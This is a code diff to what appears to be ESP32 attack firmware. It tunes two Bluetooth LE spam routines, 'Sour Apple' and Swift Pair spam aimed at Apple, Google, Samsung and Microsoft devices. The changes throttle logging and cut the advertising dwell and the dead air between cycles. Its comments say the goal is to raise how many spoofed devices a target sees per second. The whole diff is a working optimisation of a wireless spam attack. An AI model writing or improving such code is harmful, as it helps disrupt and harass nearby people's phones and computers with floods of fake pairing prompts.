@@ -2360,13 +2360,27 @@ void WiFiScan::executeSourApple() {
       this->GetUniversalAdvertisementData(Apple);
   pAdvertising->setAdvertisementData(advertisementData);
   
-  Serial.printf("[BLE] Spamming Apple with MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
-                macAddr[0], macAddr[1], macAddr[2], macAddr[3], macAddr[4], macAddr[5]);
+  // Throttled on purpose: this runs on EVERY spam cycle, and a ~60-character
+  // CDC write plus the SerialMirror ring-buffer copy costs more time than the
+  // advertising dwell itself, directly cutting how many distinct devices the
+  // target sees per second. One line per second still proves the attack is live.
+  static uint32_t sa_last_log = 0;
+  if (millis() - sa_last_log >= 1000) {
+    sa_last_log = millis();
+    Serial.printf("[BLE] Spamming Apple, MAC %02X:%02X:%02X:%02X:%02X:%02X\n",
+                  macAddr[0], macAddr[1], macAddr[2], macAddr[3], macAddr[4], macAddr[5]);
+  }
 
   pAdvertising->start();
   yield();
-  vTaskDelay(pdMS_TO_TICKS(100)); // Optimized timing for Apple devices
-  pAdvertising->stop();
+  // Dwell just long enough for a few packets to go out at the 20-30 ms interval
+  // setBaseMacAddress() configures, then let the NEXT cycle stop the advertiser.
+  // The trailing stop() that used to be here was redundant - setBaseMacAddress()
+  // already stops advertising before rotating the address, because the HCI "LE
+  // Set Random Address" command is rejected while advertising - and it created
+  // dead air between consecutive spam cycles, so one payload's advertising can
+  // now overlap the next one's setup instead of the radio going quiet in between.
+  vTaskDelay(pdMS_TO_TICKS(50));
   yield();
 #endif
 }
@@ -2399,13 +2413,26 @@ void WiFiScan::executeSwiftpairSpam(EBLEPayloadType type) {
       this->GetUniversalAdvertisementData(type);
   pAdvertising->setAdvertisementData(advertisementData);
 
-  Serial.printf("[BLE] Spamming Type %d with MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
-                (int)type, macAddr[0], macAddr[1], macAddr[2], macAddr[3], macAddr[4], macAddr[5]);
+  // Throttled for the same reason as executeSourApple(), but with one timestamp
+  // PER TYPE: BT_ATTACK_SPAM_ALL calls this three times per loop pass (Google,
+  // Samsung, Microsoft) within roughly 150 ms, so a single shared timestamp let
+  // the first call suppress the other two and the log only ever showed one type.
+  // The enum stays well under 16, and the mask keeps the index in range even if
+  // a new payload type is added later.
+  static uint32_t sp_last_log[16] = {0};
+  uint8_t sp_slot = (uint8_t)type & 0x0F;
+  if (millis() - sp_last_log[sp_slot] >= 1000) {
+    sp_last_log[sp_slot] = millis();
+    Serial.printf("[BLE] Spamming type %d, MAC %02X:%02X:%02X:%02X:%02X:%02X\n",
+                  (int)type, macAddr[0], macAddr[1], macAddr[2], macAddr[3], macAddr[4], macAddr[5]);
+  }
 
   pAdvertising->start();
   yield();
-  vTaskDelay(pdMS_TO_TICKS(100));
-  pAdvertising->stop();
+  // See executeSourApple(): the trailing stop() was redundant, because
+  // setBaseMacAddress() already stops the advertiser before rotating the MAC,
+  // and it created dead air between consecutive spam cycles.
+  vTaskDelay(pdMS_TO_TICKS(50));
   yield();
 #endif
 }
